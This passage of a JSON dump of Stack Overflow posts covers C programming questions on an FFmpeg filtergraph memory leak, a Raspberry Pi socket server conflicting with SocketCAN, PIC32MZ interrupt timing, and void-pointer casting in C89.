"https://www.gravatar.com/avatar/97e8a3c4945a8a898cbf216ce912fd46?s=128&d=identicon&r=PG", "display_name": "Fredrik Pihl", "link": "https://stackoverflow.com/users/297323/fredrik-pihl"}, "edited": false, "score": 1, "creation_date": 1499201135, "post_id": 44913445, "comment_id": 76803986, "body": "Perhaps to specific for SO, I&#39;d head over to the ffmpeg-mailinglists instead, but then again, you&#39;ll never know..."}, {"owner": {"reputation": 18895, "user_id": 288439, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81496c48185e5ddd59654ccae341c166?s=128&d=identicon&r=PG", "display_name": "Leif Andersen", "link": "https://stackoverflow.com/users/288439/leif-andersen"}, "edited": false, "score": 0, "creation_date": 1499202220, "post_id": 44913445, "comment_id": 76804391, "body": "Mm...good point. Well I&#39;ll do that and come back with whatever answer I find."}, {"owner": {"reputation": 1320, "user_id": 5495906, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5b319c1b73d80f4155fbdd4fcb81525?s=128&d=identicon&r=PG&f=1", "display_name": "LegendofPedro", "link": "https://stackoverflow.com/users/5495906/legendofpedro"}, "edited": false, "score": 0, "creation_date": 1571841904, "post_id": 44913445, "comment_id": 103375693, "body": "@LeifAndersen did you ever fix this problem? I believe I am experiencing the same thing. DrMemory reports a <i>possible leak</i>, which is upgraded to a leak when I try freeing the <code>buffersrc</code>/<code>buffersink</code> <code>AVFilter*</code> pointers in <code>init_filters()</code>. Running the function more frequently doesn&#39;t seem to make it worse, and I have looked through the FFmpeg source and it seems the functions don&#39;t allocate any memory, just set a pointer."}], "owner": {"reputation": 18895, "user_id": 288439, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81496c48185e5ddd59654ccae341c166?s=128&d=identicon&r=PG", "display_name": "Leif Andersen", "link": "https://stackoverflow.com/users/288439/leif-andersen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 836, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1499292308, "creation_date": 1499199153, "last_edit_date": 1499276985, "question_id": 44913445, "link": "https://stackoverflow.com/questions/44913445/ffmpeg-filtergraph-memory-leak", "title": "FFmpeg filtergraph memory leak", "body": "<p>I have an FFmpeg program that:</p>\n\n<ol>\n<li>Demuxes and decodes a video file.</li>\n<li>Passes it through a filtergraph</li>\n<li>encodes and muxes the new video.</li>\n</ol>\n\n<p>The filtergraph itself is rather complex, and can be run directly from the command line as such:</p>\n\n<pre><code>ffmpeg -i demo.mp4 -filter_complex \\\n \"[audio3]atrim=end=30:start=10[audio2];\\\n  [video5]trim=end=30:start=10[video4];[audio2]anull[audio6];\\\n  [video4]scale=width=1920:height=1080[video7];[audio6]anull[audio8];\\\n  [video7]fps=fps=30[video9];[audio8]anull[audio10];\\\n  [video9]format=pix_fmts=yuv420p[video11];\\\n  [audio10]asetpts=expr=PTS-STARTPTS[audio12];\\\n  [video11]setpts=expr=PTS-STARTPTS[video13];\\\n  [audio15]concat=v=0:a=1:n=1[audio14];\\\n  [video17]concat=v=1:a=0:n=1[video16];\\\n  [audio12]afifo[audio15];[video13]fifo[video17];\\\n  [audio14]afifo[audio18];[video16]fifo[video19];\\\n  [audio18]anull[audio20];\\\n  [video19]pad=width=1920:height=1080[video21];\\\n  [audio20]anull[audio22];[video21]fps=fps=25[video23];\\\n  [audio22]aformat=sample_fmts=fltp:sample_rates=44100:channel_layouts=stereo[fa];\\\n  [video23]format=pix_fmts=yuv420p[fv];[0:a]afifo[audio3];\\\n  [0:v]fifo[video5]\" \\\n-map \"[fv]\" -map \"[fa]\" out.mp4\n</code></pre>\n\n<p>I realize this is a massive filtergraph with a lot of no-op filters, it was autogenerated rather than being hand written. <a href=\"https://gist.github.com/LeifAndersen/68c87563c8f2f7af3ea7913b65c651b6\" rel=\"nofollow noreferrer\">Here is a more cleaner version of the graph.</a> (Its a graphviz file, you can run it in the command line or <a href=\"http://webgraphviz.com/\" rel=\"nofollow noreferrer\">here</a>.)</p>\n\n<p>Anyway, when I run the program that uses this filtergraph my memory usage spikes. I end up using about 7 GB of RAM for a 30 second clip. However, when I run the program using the ffmpeg command above, it peaks out at about 600 MB of RAM. This causes me to believe that the problem is not the ungodly size of the filtergraph, but a problem with how my program is using it.</p>\n\n<p>The program sets up the filtergraph (using <code>av_filter_parse_ptr</code>, giving the filtergraph string shown above), encoder, muxer, decoder, and demuxer, then spawns two threads, one that sends frames into the filtergraph, and one that receives them. The frame that sends them looks something like:</p>\n\n<pre><code>void decode () {\n    while(... more_frames ...) {\n        AVFrame *frame = av_frame_alloc();\n        ... fill next frame of stream ...\n        av_buffersrc_write_frame(ctx, frame);\n        av_frame_free(&amp;frame);\n    }\n}\n</code></pre>\n\n<p>(I have elided the <code>av_send_packet/av_receive_frame</code> functions as they don't seem to be leaking memory. I have also elided the process of flushing the buffersrc as that won't happen until the end, and the memory spikes long before that.)</p>\n\n<p>And the encoder thread looks similar:</p>\n\n<pre><code>void encode() {\n    while(... nodes_in_graph ...) {\n        AVFrame *frame = av_frame_alloc();\n        av_buffersink_get_frame(ctx, frame);\n        ... ensure frame actually was filled ...\n        ... send frame to encoder ...\n        av_frame_free(&amp;frame);\n    }\n}\n</code></pre>\n\n<p>As with the decoder, I have elided the <code>send_frame/receive_packet</code> combo as they don't seem to be leaking memory. Additionally I have elided the details of ensuring that the frame actually was filled. The code loops until the frame eventually does get filled.</p>\n\n<p>Every frame I allocate I fairly quickly deallocate. I additionally handled all of the error cases that the ffmpeg can give (Elided in the example).</p>\n\n<p>I have also tried having only one frame for the encoder and one for the decoder (and calling <code>av_frame_unref</code> in each iteration of the loop).</p>\n\n<p>Am I forgetting to free something, or am I just using the calls to libavfilter incorrectly such that it has to buffer all of the data? I don't think the leak is caused by the memory graph because running it from the command line doesn't seem to cause the same memory explosion.</p>\n\n<p>FWIW, the actual code is <a href=\"https://github.com/videolang/video/blob/master/video/private/ffmpeg-pipeline.rkt\" rel=\"nofollow noreferrer\">here</a>, although its written in Racket. I do have a minimal example that also seems to duplicate this behavior (modified from the <code>doc/example/filtering_video.c</code> file from the ffmpeg code:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n\n#include &lt;libavcodec/avcodec.h&gt;\n#include &lt;libavformat/avformat.h&gt;\n#include &lt;libavfilter/avfiltergraph.h&gt;\n#include &lt;libavfilter/buffersink.h&gt;\n#include &lt;libavfilter/buffersrc.h&gt;\n#include &lt;libavutil/opt.h&gt;\n\nconst char *filter_descr = \"trim=start=10:end=30,scale=78:24,transpose=cclock\";\n\nstatic AVFormatContext *fmt_ctx;\nstatic AVCodecContext *dec_ctx;\nAVFilterContext *buffersink_ctx;\nAVFilterContext *buffersrc_ctx;\nAVFilterGraph *filter_graph;\nstatic int video_stream_index = -1;\nstatic int64_t last_pts = AV_NOPTS_VALUE;\n\nstatic int open_input_file(const char *filename)\n{\n    int ret;\n    AVCodec *dec;\n\n    if ((ret = avformat_open_input(&amp;fmt_ctx, filename, NULL, NULL)) &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot open input file\\n\");\n        return ret;\n    }\n\n    if ((ret = avformat_find_stream_info(fmt_ctx, NULL)) &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot find stream information\\n\");\n        return ret;\n    }\n\n    /* select the video stream */\n    ret = av_find_best_stream(fmt_ctx, AVMEDIA_TYPE_VIDEO, -1, -1, &amp;dec, 0);\n    if (ret &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot find a video stream in the input file\\n\");\n        return ret;\n    }\n    video_stream_index = ret;\n\n    /* create decoding context */\n    dec_ctx = avcodec_alloc_context3(dec);\n    if (!dec_ctx)\n        return AVERROR(ENOMEM);\n    avcodec_parameters_to_context(dec_ctx, fmt_ctx-&gt;streams[video_stream_index]-&gt;codecpar);\n    av_opt_set_int(dec_ctx, \"refcounted_frames\", 1, 0);\n\n    /* init the video decoder */\n    if ((ret = avcodec_open2(dec_ctx, dec, NULL)) &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot open video decoder\\n\");\n        return ret;\n    }\n\n    return 0;\n}\n\nstatic int init_filters(const char *filters_descr)\n{\n    char args[512];\n    int ret = 0;\n    AVFilter *buffersrc  = avfilter_get_by_name(\"buffer\");\n    AVFilter *buffersink = avfilter_get_by_name(\"buffersink\");\n    AVFilterInOut *outputs = avfilter_inout_alloc();\n    AVFilterInOut *inputs  = avfilter_inout_alloc();\n    AVRational time_base = fmt_ctx-&gt;streams[video_stream_index]-&gt;time_base;\n    enum AVPixelFormat pix_fmts[] = { AV_PIX_FMT_GRAY8, AV_PIX_FMT_NONE };\n\n    filter_graph = avfilter_graph_alloc();\n    if (!outputs || !inputs || !filter_graph) {\n        ret = AVERROR(ENOMEM);\n        goto end;\n    }\n\n    /* buffer video source: the decoded frames from the decoder will be inserted here. */\n    snprintf(args, sizeof(args),\n            \"video_size=%dx%d:pix_fmt=%d:time_base=%d/%d:pixel_aspect=%d/%d\",\n            dec_ctx-&gt;width, dec_ctx-&gt;height, dec_ctx-&gt;pix_fmt,\n            time_base.num, time_base.den,\n            dec_ctx-&gt;sample_aspect_ratio.num, dec_ctx-&gt;sample_aspect_ratio.den);\n\n    ret = avfilter_graph_create_filter(&amp;buffersrc_ctx, buffersrc, \"in\",\n                                   args, NULL, filter_graph);\n    if (ret &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot create buffer source\\n\");\n        goto end;\n    }\n\n    /* buffer video sink: to terminate the filter chain. */\n    ret = avfilter_graph_create_filter(&amp;buffersink_ctx, buffersink, \"out\",\n                                       NULL, NULL, filter_graph);\n    if (ret &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot create buffer sink\\n\");\n        goto end;\n    }\n\n    ret = av_opt_set_int_list(buffersink_ctx, \"pix_fmts\", pix_fmts,\n                              AV_PIX_FMT_NONE, AV_OPT_SEARCH_CHILDREN);\n    if (ret &lt; 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Cannot set output pixel format\\n\");\n        goto end;\n    }\n\n    outputs-&gt;name       = av_strdup(\"in\");\n    outputs-&gt;filter_ctx = buffersrc_ctx;\n    outputs-&gt;pad_idx    = 0;\n    outputs-&gt;next       = NULL;\n    inputs-&gt;name       = av_strdup(\"out\");\n    inputs-&gt;filter_ctx = buffersink_ctx;\n    inputs-&gt;pad_idx    = 0;\n    inputs-&gt;next       = NULL;\n\n    if ((ret = avfilter_graph_parse_ptr(filter_graph, filters_descr,\n                                    &amp;inputs, &amp;outputs, NULL)) &lt; 0)\n        goto end;\n\n    if ((ret = avfilter_graph_config(filter_graph, NULL)) &lt; 0)\n        goto end;\n\nend:\n    avfilter_inout_free(&amp;inputs);\n    avfilter_inout_free(&amp;outputs);\n\n    return ret;\n}\n\nint main(int argc, char **argv)\n{\n    int ret;\n    AVPacket packet;\n    AVFrame *frame = av_frame_alloc();\n    AVFrame *filt_frame = av_frame_alloc();\n\n    if (!frame || !filt_frame) {\n        perror(\"Could not allocate frame\");\n        exit(1);\n    }\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s file\\n\", argv[0]);\n        exit(1);\n    }\n\n    av_register_all();\n    avfilter_register_all();\n\n    if ((ret = open_input_file(argv[1])) &lt; 0)\n        goto end;\n    if ((ret = init_filters(filter_descr)) &lt; 0)\n        goto end;\n\n    /* read all packets */\n    while (1) {\n        if ((ret = av_read_frame(fmt_ctx, &amp;packet)) &lt; 0)\n            break;\n\n        if (packet.stream_index == video_stream_index) {\n            ret = avcodec_send_packet(dec_ctx, &amp;packet);\n            if (ret &lt; 0) {\n                av_log(NULL, AV_LOG_ERROR, \"Error while sending a packet to the decoder\\n\");\n                break;\n            }\n\n            while (ret &gt;= 0) {\n                ret = avcodec_receive_frame(dec_ctx, frame);\n                if (ret == AVERROR(EAGAIN) || ret == AVERROR_EOF) {\n                    break;\n                } else if (ret &lt; 0) {\n                    av_log(NULL, AV_LOG_ERROR, \"Error while receiving a frame from the decoder\\n\");\n                    goto end;\n                }\n\n                if (ret &gt;= 0) {\n                     frame-&gt;pts = av_frame_get_best_effort_timestamp(frame);\n\n                    /* push the decoded frame into the filtergraph */\n                    if (av_buffersrc_add_frame_flags(buffersrc_ctx, frame, AV_BUFFERSRC_FLAG_KEEP_REF) &lt; 0) {\n                        av_log(NULL, AV_LOG_ERROR, \"Error while feeding the filtergraph\\n\");\n                        break;\n                    }\n\n                    /* pull filtered frames from the filtergraph */\n                    while (1) {\n                        ret = av_buffersink_get_frame(buffersink_ctx, filt_frame);\n                        if (ret == AVERROR(EAGAIN) || ret == AVERROR_EOF)\n                            break;\n                        if (ret &lt; 0)\n                            goto end;\n                        av_frame_unref(filt_frame);\n                    }\n                    av_frame_unref(frame);\n                }\n            }\n        }\n        av_packet_unref(&amp;packet);\n    }\nend:\n    avfilter_graph_free(&amp;filter_graph);\n    avcodec_free_context(&amp;dec_ctx);\n    avformat_close_input(&amp;fmt_ctx);\n    av_frame_free(&amp;frame);\n    av_frame_free(&amp;filt_frame);\n\n    return ret;\n}\n</code></pre>\n"}, {"tags": ["c", "can-bus", "socketcan"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499296542, "post_id": 44912962, "comment_id": 76851192, "body": "<code>error( const_cast&lt;char *&gt;</code> This is not <code>C</code>"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 7363689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QebQL.jpg?s=128&g=1", "display_name": "evil_doctor", "link": "https://stackoverflow.com/users/7363689/evil-doctor"}, "is_accepted": false, "score": 0, "last_activity_date": 1499296296, "last_edit_date": 1499296296, "creation_date": 1499211611, "answer_id": 44915235, "question_id": 44912962, "link": "https://stackoverflow.com/questions/44912962/socket-can-does-not-work-when-using-linux-socket-communicationvia-wifi/44915235#44915235", "title": "Socket-CAN does not work when using linux socket-communication(via wifi)", "body": "<p>Try initializing your clilen in your first while loop where the accept() and write() functions are called. </p>\n\n<pre><code>while ( 1 ) {\n    printf( \"waiting for new client.....n\" );\n\n    clilen = sizeof(struct sockaddr_in);\n    if ( ( newsockfd = accept( sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen) ) &lt; 0 )\n        error( const_cast&lt;char *&gt;(\"ERROR on accept\") );\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8255587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cbd0f751b9153b67e8318a374d7f779?s=128&d=identicon&r=PG&f=1", "display_name": "whoami", "link": "https://stackoverflow.com/users/8255587/whoami"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 479, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1499296296, "creation_date": 1499196417, "last_edit_date": 1499198220, "question_id": 44912962, "link": "https://stackoverflow.com/questions/44912962/socket-can-does-not-work-when-using-linux-socket-communicationvia-wifi", "title": "Socket-CAN does not work when using linux socket-communication(via wifi)", "body": "<p>this is Server-side code (raspberry pi)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;netdb.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;errno.h&gt;\n\n#include &lt;unistd.h&gt;\n#include &lt;wiringPi.h&gt;\n#include &lt;softPwm.h&gt;\n#include &lt;pthread.h&gt;\n\nvoid error( char *msg ) {\n  perror(  msg );\n  exit(1);\n}\n\nint func( int a ) {\n   return 2 * a;\n}\n\nvoid sendData( int sockfd, int x ) {\n  int n;\n\n  char buffer[32];\n  sprintf( buffer, \"%dn\", x );\n  if ( (n = write( sockfd, buffer, strlen(buffer) ) ) &lt; 0 )\n    error( const_cast&lt;char *&gt;( \"ERROR writing to socket\") );\n  buffer[n] = '';\n}\n\nint getData( int sockfd ) {\n  char buffer[32];\n  int n;\n\n  if ( (n = read(sockfd,buffer,31) ) &lt; 0 )\n    error( const_cast&lt;char *&gt;( \"ERROR reading from socket\") );\n  buffer[n] = '';\n\n  printf(\"buffer: %s n\",buffer);\n\n\n\n  return atoi( buffer );\n}\n\nint main(int argc, char *argv[]) {\n\n    char buf[30];\n     int sockfd, newsockfd, portno = 1219, clilen;\n     char buffer[256];\n     struct sockaddr_in serv_addr, cli_addr;\n     int n;\n     int data;\n\n     printf( \"using port #%dn\", portno );\n\n     sockfd = socket(AF_INET, SOCK_STREAM, 0);\n     if (sockfd &lt; 0)\n         error( const_cast&lt;char *&gt;(\"ERROR opening socket\") );\n     bzero((char *) &amp;serv_addr, sizeof(serv_addr));\n\n     serv_addr.sin_family = AF_INET;\n     serv_addr.sin_addr.s_addr = INADDR_ANY;\n     serv_addr.sin_port = htons( portno );\n     if (bind(sockfd, (struct sockaddr *) &amp;serv_addr,\n              sizeof(serv_addr)) &lt; 0)\n       error( const_cast&lt;char *&gt;( \"ERROR on binding\" ) );\n     listen(sockfd,5);\n     clilen = sizeof(cli_addr);\n\n     //--- infinite wait on a connection ---\n     while ( 1 ) {\n        printf( \"waiting for new client.....n\" );\n\n        if ( ( newsockfd = accept( sockfd, (struct sockaddr *) &amp;cli_addr, (socklen_t*) &amp;clilen) ) &lt; 0 )\n            error( const_cast&lt;char *&gt;(\"ERROR on accept\") );\n\n        recv(newsockfd,buf,31,0);\n        printf( \"opened new communication with clientn\" );\n        printf( \"sockfd: %dn\",sockfd );\n        printf( \"newsockfd: %d n \",newsockfd );\n\n        int res = strcmp(buf,\"go\");\n        printf(\"res: %dn\",res);\n        write(newsockfd,\"message received! [ from raspi server ! ]\",50);\n\n        while ( 1 ) {\n\n             //---- wait for a number from client ---\n            data = getData( newsockfd );\n            //recv(newsockfd,buf,31,0);\n            // printf(\"%s n\",buf);\n\n             printf( \"got %dn\", data );\n             if ( data &lt; 0 )\n                break;\n\n             data = func( data );\n\n             //--- send new data back ---\n             printf( \"sending back %dn\", data );\n             sendData( newsockfd, data );\n\n\n        }\n\n        close( newsockfd );\n\n        //--- if -2 sent by client, we can quit ---\n        if ( data == -2 )\n          break;\n     }\n\n\n     return 0;\n}\n</code></pre>\n\n<p>As soon as start using this linux socket communication program(when mylaptop, which is the client, gets connected to linux machine ), socket-CAN based program(CAN communication open source library based mcp 2515..) does not work saying that \n\"write : no buffer space available\" when i tried to do candump\ncheck below picture</p>\n\n<p><a href=\"https://i.stack.imgur.com/78p07.jpg\" rel=\"nofollow noreferrer\">Image</a></p>\n\n<p>I guess it has something to do with the linux socket program i used above code for socket communication between linux machine(raspberry, linux) and my laptop(window). but i don't know how to avoid problem related 'buffer space' and what caused it. Maybe I should flush buffer every time i get socket frame?\nanyone have some idea what i should do for getting both Socket-CAN and linux socket communication work at the same time? </p>\n"}, {"tags": ["c", "performance", "timer", "interrupt", "pic32"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499297932, "post_id": 44912896, "comment_id": 76851562, "body": "I&#39;m not totally familiar with your setup, However, code takes a while to occur and a interrupt can take (at least) one clock to occur, and 1 clock to return so the chip, even at 160mhz is not fast enough to handle a interrupt at 1usec intervals."}, {"owner": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499600812, "post_id": 44912896, "comment_id": 76966036, "body": "thank you for you answer in my opinion, 160MHz should be more than enough to drive an interrupt with 1us (this would be 160 clock cycles for one interrupt)"}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "edited": false, "score": 0, "creation_date": 1499596526, "post_id": 44914030, "comment_id": 76964900, "body": "thank you very much for your thoughts!  1) I was able to verify the clocks with my oscilloscope by enabling the OSC2 output   2) I reduced the ISR to only toggle the pin (full speed) and still measured a speed of 2us :/  3) Not possible with the free version  4) I tried it - no difference"}, {"owner": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "edited": false, "score": 0, "creation_date": 1499621099, "post_id": 44914030, "comment_id": 76972103, "body": "I now also tried the compiler optimization level 3 with the 60-day-demo version of the xc32 pro compiler - unfortunately this does not help either"}, {"owner": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "edited": false, "score": 0, "creation_date": 1499628928, "post_id": 44914030, "comment_id": 76974433, "body": "I replaced my blink() function by: LATBINV = 1&lt;&lt;8 and now it works at 1us!"}, {"owner": {"reputation": 36, "user_id": 7582328, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a1603d1e0bd2951042b0e9e1d2d7a0a?s=128&d=identicon&r=PG&f=1", "display_name": "Franck D.", "link": "https://stackoverflow.com/users/7582328/franck-d"}, "reply_to_user": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "edited": false, "score": 0, "creation_date": 1499776166, "post_id": 44914030, "comment_id": 77042768, "body": "Great, looks like you made progress. Another thing you can do to help you debug timings like this is to simply toggle a GPIO at the very beginning and the end of your ISR and look at the result on your oscilloscope. That way you can more easily see the effect of your different settings or code optimizations. You should see your ISR execution time reduced as you optimize your code."}], "tags": [], "owner": {"reputation": 36, "user_id": 7582328, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a1603d1e0bd2951042b0e9e1d2d7a0a?s=128&d=identicon&r=PG&f=1", "display_name": "Franck D.", "link": "https://stackoverflow.com/users/7582328/franck-d"}, "is_accepted": true, "score": 1, "last_activity_date": 1499202625, "creation_date": 1499202625, "answer_id": 44914030, "question_id": 44912896, "link": "https://stackoverflow.com/questions/44912896/microchip-harmony-timing-issues-on-pic32mz/44914030#44914030", "title": "Microchip Harmony timing issues on PIC32MZ", "body": "<p>I am not very familiar with that specific microcontroller but have worked a lot with Microchip PICs, so here are some points you might want to look at:</p>\n\n<p>1- First make sure your clocks (CPU and PBCLK) really run at the speed you think they run. You can usually output some of your internal clocks on an external pin (usually REFCLKO on PIC32s). That way you can measure them with an oscilloscope and make sure they are correctly configured.</p>\n\n<p>2- Make sure you minimize the internal execution time of your interrupt. Check if PLIB_INT_SourceFlagClear() is a macro-like function or an actual function call. If this is a function call, you might want to work at the register level to avoid this overhead.</p>\n\n<p>3- Enable compiler optimization. By the way, it is also a good practice when working with a global variable from within an interrupt to declare it as volatile (or declare it static inside your interrupt handler function).</p>\n\n<p>4- Unless it is explicitely documented by Microchip, verify if you should clear your interrupt at the beginning of your interrupt handler instead of the end. What might happen in your case, especially if you set its period to a very short period of time, is that your timer expires again while you are still inside your interrupt handler but BEFORE you clear its flag. That would result in an extra delay before your interrupt fires again. What you want is to clear the flag as soon as possible so if the timer expires again, it sets the flag which will result in your interrupt handler to fire again as soon as it completes its execution. Of course that would not give any time for your background application to execute though...</p>\n\n<p>5- I am also assuming that your timer is correctly configured, that is it reloads its internal count to 0 when the period expires, but take a look to make sure it is the case.</p>\n\n<p>Franck</p>\n"}], "owner": {"reputation": 21, "user_id": 8255544, "user_type": "registered", "profile_image": "https://graph.facebook.com/1628824600463922/picture?type=large", "display_name": "Oliver", "link": "https://stackoverflow.com/users/8255544/oliver"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 862, "favorite_count": 1, "accepted_answer_id": 44914030, "answer_count": 1, "score": 1, "last_activity_date": 1508700972, "creation_date": 1499196105, "last_edit_date": 1508700972, "question_id": 44912896, "link": "https://stackoverflow.com/questions/44912896/microchip-harmony-timing-issues-on-pic32mz", "title": "Microchip Harmony timing issues on PIC32MZ", "body": "<p>I am using MPLABX + Harmony framework to write code for a PIC32MZ1024EFK064.</p>\n\n<p>My goal is, to trigger the ISR every microsecond.\nIn order to test this, I toggle a LED after 1000000 cycles of the ISR:</p>\n\n<pre><code>uint32_t xxx = 0;\n\nvoid __ISR(_TIMER_2_VECTOR, ipl1AUTO) IntHandlerDrvTmrInstance0(void)\n{\n\n    xxx++;\n\n    if(xxx &gt; 1000000){\n\n        xxx = 0;\n        blink();\n\n    }\n\n    PLIB_INT_SourceFlagClear(INT_ID_0,INT_SOURCE_TIMER_2);\n\n}\n</code></pre>\n\n<p>Timer2 runs at 80MHz with a prescaler of 1 with a timer period of 80.</p>\n\n<p>At my first attempt, the <strong>LED toggled every 4 seconds</strong> (ISR = every 4us).</p>\n\n<p>I figured out that I <strong>can reach 2 seconds</strong> by changing the Postscaler of <strong>PBCLK7 from 2 to 1</strong>. (now the CPU-core runs at 160MHz instead of 80MHz).</p>\n\n<p>But even when I change the timer period to 1, I only get my LED toggled every 2 seconds.</p>\n\n<p>Any idea how to speed things up further here?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>The subroutine <code>blink()</code> was too slow.\nBy manipulating the Register directly, it works at 1us</p>\n\n<pre><code>void __ISR(_TIMER_2_VECTOR, ipl1AUTO) IntHandlerDrvTmrInstance0(void)\n{\n    LATBINV = 1&lt;&lt;8;\n    PLIB_INT_SourceFlagClear(INT_ID_0,INT_SOURCE_TIMER_2);\n}\n</code></pre>\n"}, {"tags": ["c", "c89"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499195764, "post_id": 44912786, "comment_id": 76801931, "body": "<code>void **</code> is <i>not</i> the same as <code>void *</code>."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499195803, "post_id": 44912786, "comment_id": 76801949, "body": "funny: I get <code>a[0] = 0.000000 a[1] = 10.000000 d = 10.000000</code>"}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/1i0Z6.jpg?s=128&g=1", "display_name": "bl4ckb0ne", "link": "https://stackoverflow.com/users/3666903/bl4ckb0ne"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499195829, "post_id": 44912786, "comment_id": 76801956, "body": "@Jean-Fran&#231;oisFabre using gcc or clang ?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499195850, "post_id": 44912786, "comment_id": 76801966, "body": "<code>gcc</code> in my case."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499196103, "post_id": 44912786, "comment_id": 76802072, "body": "<code>double * a = (double*)args;</code> --&gt; <code>double a[] = { *(double*)args[0], *(double*)args[1] };</code> (and try <code>%lf</code> --&gt; <code>%f</code> )"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499198461, "post_id": 44912786, "comment_id": 76803008, "body": "That looks like a very bad idea. Don&#39;t use <code>void *</code> without <b>a good</b> reason. As you instantly cast to <code>double *</code>, use a parameter of this type. As a sidenote: don&#39;tr use ancient C89/90! Use modern, standard C, i.e. C11, at least C99."}, {"owner": {"reputation": 877, "user_id": 3666903, "user_type": "registered", "accept_rate": 52, "profile_image": 